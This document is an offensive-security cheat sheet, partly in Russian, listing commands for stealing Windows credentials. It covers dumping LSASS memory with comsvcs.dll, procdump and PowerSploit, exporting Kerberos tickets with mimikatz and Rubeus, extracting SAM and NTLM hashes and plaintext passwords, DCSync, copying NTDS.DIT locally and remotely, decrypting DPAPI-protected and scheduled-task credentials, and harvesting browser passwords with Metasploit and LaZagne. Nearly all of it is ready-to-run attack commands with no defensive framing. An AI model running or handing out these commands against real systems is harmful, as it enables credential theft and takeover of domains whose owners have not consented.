## Извлечение Kerberos-tickest через дамп виртуальной памяти:
**Три способа дампа памяти:**  
1) taskmgr.exe → ПКМ по lsass.exe → дамп памяти;  
2) rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full  
3) procdump.exe -ma lsass.exe /accepteula.  
  
Если дамп удалось создать, то билеты можно безопасно извлечь уже на своей стороне:  
mimikatz.exe -> sekurlsa::Minidump lsass.dmp -> sekurlsa::tickets /export  
  
## Извлечение Kerberos-tickest (Rubeus):  
**Список доступных тикетов**: Rubeus.exe triage  
**Извлекаем TGT пользователя**: Rubeus.exe dump /luid:0xfffff /service:krbtgt /nowrap  
**Aditional information**: Tickets for the service name krbtgt are Ticket Granting Tickets (TGTs) and others are Ticket Granting Service Tickets (TGSs).  

## Извлечение хешей SAM (нужны учетные данные пользователя):  
secretsdump.py [domain]/[username]:[password]@[TARGET IP]  

## Извлечение хешей SAM (mimikatz):  
\mimikatz.exe token::elevate lsadump::sam exit  

## Извлечение NTLM/plaintext passwords (mimikatz):  
\mimikatz.exe token::elevate sekurlsa::logonpasswords exit  

## Извлечение Kerberos Encryption Keys (mimikatz): extract aes256_hmac value  
\mimikatz.exe token::elevate sekurlsa::ekeys exit  

## Domain cached credentials:  
Позволяет исользовать учетные данные домена, если нет связи с DC.   
\mimikatz.exe token::elevate lsadump::cache exit  

## DCSync (mimikatz):  
\mimikatz.exe token::elevate lsadump::dcsync exit  

## Powershell mimikatz:  
1) Invoke-Mimikatz -DumpCreds  
2) Invoke-Mimikatz -DumpCreds -ComputerName@("comp1","comp2")  

## DCSync with Kiwi:  
load kiwi  
dcsync_ntlm username  

## Manualy dump registry with Reg:
reg.exe save hklm\sam c:\temp\sam.save -> reg.exe save hklm\security c:\temp\security.save -> reg.exe save hklm\system c:\temp\system.save

**Crack dumped registry data**:  
1. creddump7\pwdump.py system sam  
2. secretsdump.py -system system -sam sam LOCAL  

## Retrieval of NTDS.DIT with ntdsutil:  
ntdsutil "activate instance ntds" ifm "create full C:\temp\ntdsutil" quit quit  

## Dump of LSASS with ProcDump:  
C:\Users\Administrator\Downloads\procdump.exe -accepteula -64 -ma lsass.exe c:\temp\lsass.dmp  

## Dump of LSASS with pd:  
C:\Users\Administrator\Downloads\pd.exe -p 552 > c:\temp\lsass.dump  

## Dump of LSASS with Minidump:  
Import-Module c:\users\administrator\downloads\PowerSploit-master\Exfiltration\Out-Minidump.ps1  
Get-Process lsass | Out-Minidump -DumpFilePath c:\temp  

## Retrieval of NTDS.DIT with NinjaCopy:  
**Local**:  
1) Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1  
2) Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\temp\ntds.dit"  

**Remote**:  
1) Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1  
2) Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\temp\ntds.dit" -ComputerName "WIN-25U0PFAB511"  

## Credentials manager (Seatbelt, Mimikatz):  
**List of credentials**:  
 - vaultcmd /list  
 - Seatbelt.exe WindowsVault //(The encrypted credentials stored in the users' "Credentials" directory)  
 - Seatbelt.exe WindowsCredentialFiles  
 - dir C:\Users\username\AppData\Local\Microsoft\Credentials  

**Obtain master key for decrypt stored credentials**:  
1) Mimikatz 1: sekurlsa::dpapi  
2) Mimikatz 2: dpapi::masterkey /in:C:\Users\username\AppData\Roaming\Microsoft\Protect\SID\GUID /rpc  

**Decrypt stored credentials**:  
mimikatz dpapi::cred /in:C:\Users\username\AppData\Local\Microsoft\Credentials\ID /masterkey:masterkeyValue  

## Scheduled Task Credentials (Mimikatz):  
**List of tasks**: dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials  

**Find GIUD amd master key**: 
  - dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\ID //GUID  
  - sekurlsa::dpapi //master key  

**Decrypt stored creds**:  
dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\ID /masterkey:masterkeyValue  

## Browser storage:  
**Metasploit**:  
1) run post/windows/gather/enum_chrome 
2) run post/windows/gather/credentials/chrome  
3) run post/multi/gather/firefox_creds  

Rename file.bin to cert9.db

**Tools for crack firefox passwords**: https://github.com/Unode/firefox_decrypt  

## LAZAGNE.EXE:  
lazagne.exe all  

